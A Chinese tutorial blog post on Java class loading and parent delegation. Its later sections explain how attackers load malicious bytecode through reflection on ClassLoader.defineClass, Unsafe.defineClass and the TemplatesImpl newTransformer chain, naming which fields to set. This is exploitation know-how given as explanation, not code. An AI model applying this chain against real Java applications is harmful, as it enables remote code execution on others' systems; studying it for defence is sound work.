1. 解读

1.1 什么是类加载？

类加载 是指将类的字节码（.class 文件）从文件系统或网络等源读取到内存中，并将其转换为 JVM 能够理解的格式的过程。类加载是 JVM 执行 Java 程序的关键步骤之一，确保类在被使用之前已经正确加载到内存中。

1.2 什么时候会发生类加载？

类加载一般在首次 主动使用类 时触发。

  1. 创建类的实例时
  2. 访问类的静态成员时（静态变量或静态方法）
  3. 调用 Class.forName() 方法显式加载类时
  4. 访问编译期不可确定的静态常量时

如果访问的是静态常量，且该常量的值需要在运行时计算，那么在首次访问时，类会被加载。

  1. 类的子类初始化时

当某个类的子类被初始化时，如果该子类依赖父类中的静态字段或静态方法，那么会首先触发父类的加载和初始化。

  1. JVM 启动时加载主类（包含 main() 方法的类）
  2. 动态代理类生成时
  3. 反射创建类实例时

[!CAUTION]

使用 Person.class 获取类的 Class 对象引用时，不会触发类的加载。

1.3 类是如何被加载的？

  1. 加载

加载阶段是类加载的第一步，在这个阶段，JVM 通过类加载器将字节码文件（.class 文件）从磁盘或网络读取到内存中，并生成一个 Class 对象，该对象代表类的元信息。查找并加载类的字节码，将类的二进制数据读入 JVM 内存，创建一个 Class 对象，用来封装该类的信息（类名、方法、属性等）。加载完成后，类会被 JVM 标记为“已加载”，但还没有进行后续的初始化和链接。

  1. 连接

连接阶段将类的字节码转换为 JVM 可以直接使用的格式，并对类的各种符号引用进行解析。连接阶段又细分为三个子阶段：

  • 验证：在验证阶段，JVM 会检查加载的字节码是否符合 JVM 规范，并确保类文件没有被篡改或破坏，保证字节码的安全性和合法性。如果验证失败，类的加载会被终止，并抛出 VerifyError 等异常。

  • 准备：准备阶段为类的静态变量分配内存，并将其初始化为默认值，而不是程序中定义的值。

  • 解析：解析阶段是将类的常量池中的符号引用（如方法、字段名等）替换为直接引用（内存地址）。符号引用是编译期生成的，而直接引用是在类加载完成后通过查找相关对象在内存中的地址得到的。

  1. 初始化

初始化阶段是类加载的最后一步。在这个阶段，类的静态变量会被赋予程序中定义的初始值，静态代码块也会被执行。这个阶段也是类的主动使用阶段，当类的静态字段或静态方法被使用时，类会在此阶段执行。

  1. 使用

在类完成加载、连接和初始化后，JVM 可以使用该类进行实例化或调用其静态成员、静态方法等。此时，类的所有静态成员和方法都可以正常使用。

  1. 卸载

当一个类不再被使用且没有被引用时，JVM 会通过垃圾回收机制将其从内存中卸载。类的卸载是由 JVM 自动完成的，一般不会手动触发。类的卸载过程释放类加载器和类的 Class 对象所占用的内存。

1.4 类加载器

类加载器是 Java 用来动态加载 .class 文件的组件，它负责从文件系统、网络等不同来源中加载类的字节码，并将它们转换为 JVM 可以使用的 Class 对象。每个类加载器都是 ClassLoader 类的一个实例，Java 提供了不同类型的类加载器用于加载不同的类。

  1. 启动类加载器（Bootstrap ClassLoader）

启动类加载器是最顶层的类加载器，由 C++ 语言实现，负责加载 Java 核心类库（如 rt.jar）中的类，如 java.lang.String、java.util 等。启动类加载器无法通过 Java 代码直接访问。

  1. 扩展类加载器（Extension ClassLoader）

扩展类加载器负责加载 JRE 的扩展类库，通常是 jre/lib/ext 目录下的类。扩展类加载器是由 Java 实现的，可以通过 ClassLoader 类的 getParent() 方法获取。

  1. 应用类加载器（Application ClassLoader）

应用类加载器负责加载应用程序类路径下的类（通常是 classpath 下的类），这是 Java 程序中最常用的类加载器。当运行一个 Java 程序时，大多数应用类都是由该类加载器加载的。

  1. 自定义类加载器（Custom ClassLoader）

Java 允许开发者创建自定义的类加载器，通过继承 ClassLoader 类并覆盖 findClass() 方法，可以定制类的加载过程。

1.5 双亲委派机制

双亲委派机制是类加载器加载类时的一种约定，即当一个类加载器收到类加载请求时，它会先将请求委派给它的父类加载器进行加载，（这里的“父类加载器”只是逻辑上的父类，而不是真正的父类。）只有当父类加载器无法加载该类时，子加载器才会尝试自己加载。这种机制确保了核心类库（如 java.lang.Object 等）不会被自定义的类加载器重复加载或覆盖，从而确保 Java 核心类库的安全性和一致性，防止核心类库被恶意篡改或被覆盖。

双亲委派机制的工作流程：

  1. 类加载器收到类加载请求后，先将该请求委派给父类加载器。
  2. 如果父类加载器能够成功加载该类，则直接使用父类加载器加载的类。
  3. 如果父类加载器无法找到该类，子类加载器才会尝试自己加载。

  • 应用类加载器首先收到请求加载 Person 类。

  • 它会将加载请求委派给它的父类加载器——扩展类加载器。

  • 扩展类加载器又将请求继续委派给它的父类，即启动类加载器。

  • 启动类加载器尝试加载 Person 类，但找不到该类，于是返回控制给扩展类加载器，扩展类加载器同样找不到，最终由应用类加载器尝试加载，成功加载 Person 类。

这种机制确保了像 java.lang.Object 这样的类永远由启动类加载器加载，即使在自定义的类加载器中存在同名的类，也不会破坏核心类的加载。

1.6 为什么需要双亲委派机制？

双亲委派机制的主要目的是确保 Java 核心类库的安全性和一致性，防止核心类库被恶意篡改或被覆盖。

  • 避免重复加载：通过双亲委派机制，确保 java.lang.Object 等核心类库只会被启动类加载器加载一次，不会因为应用程序中的自定义类加载器而重复加载或覆盖。

  • 防止安全漏洞：如果没有双亲委派机制，用户可以在自定义类加载器中定义与核心类库同名的类，可能会导致核心类库被错误地加载，从而引发安全问题。

假设定义了一个与核心类库同名的类 java.lang.String，并通过自定义类加载器加载：

如果没有双亲委派机制，程序可能会加载这个自定义的 String 类，导致程序行为异常。双亲委派机制确保了系统核心类库（如 java.lang.String）总是优先由父类加载器加载，从而避免了这种情况的发生。

4. 利用 ClassLoader 加载字节码

在前面的类加载分析中，我们可以知道类加载最核心的方法其实是 ClassLoader.defineClass()，它可以将查找到的类的字节码文件转换为 Class 对象。

ClassLoader#defineClass 是一个 native 方法，其具体实现是在 JVM 的底层，用 C/C++ 语言编写。该方法将字节数组或 ByteBuffer 中的字节码转换为一个 Class 对象，即把类的字节码转换为 JVM 可以理解的内部结构。

我们在IDEA中看到的 ClassLoader 类其实是一个重载版本，它的 defineClass() 方法是一个 protected 方法，它在内部才调用了底层的 native 方法。该方法的参数 name 为类名，b 为字节码数组，off 为偏移量，len 为字节码数组长度。

由于 defineClass() 被 protected 修饰，无法在外部直接访问，所以采用反射的方法调用该方法，来实现加载任意字节码。

由于 defineClass 是 protected 方法，一般情况下无法直接调用。必须通过反射和 setAccessible(true) 来设置访问控制权限，这样子可能会触发 Java 的安全机制，尤其是在开启了 SecurityManager 时。defineClass 方法一般都不对外开放，我们很难在现实的攻击场景中利用它。而且如果类加载器被严格控制，想通过这种方法实现恶意字节码注入也很困难。

5. 利用 Unsafe 加载字节码

Unsafe 类通过单例模式对外提供服务，无法通过 new 来创建对象。它的实例是通过私有静态变量来管理的。

Unsafe 类提供获取 Unsafe 实例的方法是通过 getUnsafe() 方法，但这个方法有严格的权限限制。如果当前的类加载器不是引导类加载器（Bootstrap ClassLoader），getUnsafe() 会抛出 SecurityException，阻止程序直接访问 Unsafe。

虽然直接实例化 Unsafe 被限制，但是我们可以通过反射绕过这种限制，获取 Unsafe 实例。

获取到 Unsafe 实例后，我们可以调用 Unsafe 类中的 defineClass() 方法，绕过常规的类加载机制直接定义类，用来将恶意类字节码文件转换成恶意类 Class 对象，实例化后对目标造成攻击。

该方法的参数 name 为要加载的类名，b 为类的字节码数组，off 为字节码数组的起始位置，len 为字节码数组的长度，loader 为要将类加载到的类加载器，domain 为保护域，表示类的安全上下文，一般传 null 即可。

6. 利用 TemplatesImpl 加载字节码

在利用 ClassLoader 加载字节码中我们有了解到，defineClass 方法一般都不对外开放，我们很难在现实的攻击场景中利用它，但是这不代表着我们无法利用 defineClass() 进行攻击了。

TemplatesImpl 是 Java XML 库 com.sun.org.apache.xalan.internal.xsltc.trax 中的一个类，它实现了 javax.xml.transform.Templates 接口，用于存储 XSLT 编译后的字节码，并在运行时加载和执行。

TemplatesImpl 类中定义了一个私有内部类 TransletClassLoader，该内部类重写了defineClass() 方法，并且没有显式地声明其作用域，所以默认作用域为 default，可以在类的外部被调用。在执行 XSLT 转换时，TransletClassLoader 会调用 defineClass 方法，将编译后的字节码加载到 JVM 中，这就为我们提供了一个直接执行恶意代码的途径。

在 IDEA 中使用 Alt + Ctrl + H 可以查看 defineClass() 方法的调用链。

首先查看 TemplatesImpl#defineTransletClasses() 方法。

由于 defineTransletClasses() 方法是一个私有方法，无法直接调用，继续查看 TemplatesImpl#getTransletInstance()。

由于 getTransletInstance() 方法还是一个私有方法，无法直接调用，接下来继续查看 TemplatesImpl#newTransformer()。

newTransformer() 方法是一个公开方法，我们可以在类的外部直接调用，这样子我们直接从 newTransformer() 方法直接入手就好了。首先 newTransformer() 方法在调用 getTransletInstance() 方法前并没有什么限制，我们直接进入 getTransletInsrance()。

我们可以看到在调用 defineTransletClasses() 方法前，程序判断了 _name 是否为 null，如果为 null，则返回一个 null，就无法继续走到我们准备构造利用链中的 defineTransletClasses() 方法。

我们可以通过反射给 _name 随意赋一个 String 类型的值，_class 本来的值就是 null，程序继续走进 defineTransletClasses()。

在执行 defineClass() 方法之前，如果 _bytecodes 为 null，则会 TransformerConfigurationException 抛出错误。由 defineClass() 方法我们，可以知道 _bytecodes 数组其实就是恶意类字节码数组，到时候将字节码数组传给 _bytecodes 数组即可。

在这段代码中 _tfactory 其实也不能为 null，不然程序会报 NullPointerException 错误。_tfactory 是 TransformerFactoryImpl 类型的参数，我们可以直接 new TransformerFactoryImpl() 给其赋值。

还有 TemplatesImpl 通过内部的 defineTransletClasses() 方法，将编译的字节码加载为 JVM 中的 Class 对象，它需要确保这些类具有 XSLT 转换的功能。而这些功能大部分是由 AbstractTranslet 提供的，所以这些字节码必须继承自 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 类，否则无法进行有效的 XSLT 转换。

这段代码中，loader.defineClass(_bytecodes[i]) 加载字节码并返回对应的类对象。然后，通过 getSuperclass() 获取该类的父类。如果父类是 AbstractTranslet，则标记为主类 _transletIndex；否则，将该类存入辅助类集合 _auxClasses 中。如果 _transletIndex 的值在循环结束后仍然小于 0，说明在加载的字节码中没有找到继承自 AbstractTranslet 的类，这时程序会抛出异常，提示没有找到主转换类 (NO_MAIN_TRANSLET_ERR)。
